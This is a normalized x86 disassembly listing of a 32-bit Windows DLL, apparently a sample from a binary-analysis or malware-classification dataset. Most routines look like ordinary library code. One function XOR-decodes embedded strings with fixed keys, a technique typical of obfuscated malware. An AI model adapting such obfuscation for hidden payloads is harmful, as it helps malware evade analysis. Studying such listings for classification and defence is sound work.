cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
pop esi
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xa0
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_1000a6f0
sub_1003a210
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1003a25a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push 0x0
push 0x1
call sub_1004dbe5
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
lea eax [ eax + eax + 0x2 ]
push eax
push esi
push edi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
sub_1003a2c0
mov edx [ edi ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push ebx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005e3c0
mov ecx [ edi + 0x4 ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x20 ] edx
mov eax esi
pop ebx
retn
sub_1003a308
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000702c
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_10012991
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_10012991
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_10069589
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_1007be43
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_1003a3e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081958
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
cmp [ eax + 0x1c ] ebx
jne r-xdata
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10027c00
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x8
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
jmp r-xdata
mov edi [ ebp - 0x1c ]
cmp ecx 0x8
lea eax [ eax + edi * 2 ]
mov ecx edx
jae r-xdata
lea eax [ ebp - 0x2c ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x30 ]
push edx
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_1003b330
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
sub_1003a4b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007600
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1003a4d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_100539e5
mov ebx [ eax + 0x4 ]
call sub_1001f959
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_100264a3
add esp 0x20
test eax eax
jne r-xdata
mov eax esi
cmp esi edi
jl r-xdata
test ebx ebx
jne r-xdata
sub eax 0x2
call sub_10012991
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100594b5
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1003a565
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1007ca2f
pop ebp
retn
sub_1003a58f
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1003a620
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push r--data
push ecx
mov edx 0xa
mov [ ebp - 0x1c ] 0x0
call sub_1006b8d0
add esp 0xc
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x18 ]
mov [ esi ] dx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
call sub_1005e3c0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1003a6a0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc9
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x20 ]
xor eax eax
push ecx
mov [ ebp - 0x12 ] ax
call esi
lea edx [ ebp - 0x34 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_10078600
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_10078600
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x34 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_10078600
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_10078600
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x20 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_10078600
add esp 0xc
lea edx [ ebp - 0x20 ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1003a850
push ebp
mov ebp esp
push 0xffffffff
push sub_1008076d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10042df0
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1005d090
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000c8b0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10005d00
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
push esi
push ebx
call sub_10019070
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_1000c130
mov eax [ ebp - 0x120 ]
push eax
call sub_10065045
add esp 0x14
sub_1003b0a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_1001b6f0
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_10012991
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_1003b0e0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
call sub_1002d110
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_1003b4a6
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0xc ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x8 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
push edi
call sub_10004d50
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call sub_10065045
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edi [ edx + 0x4 ]
je r-xdata
push edi
call sub_100593e0
mov ecx [ ebp - 0xc ]
add esp 0x4
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov [ esi + 0x14 ] 0x0
call sub_100274a0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
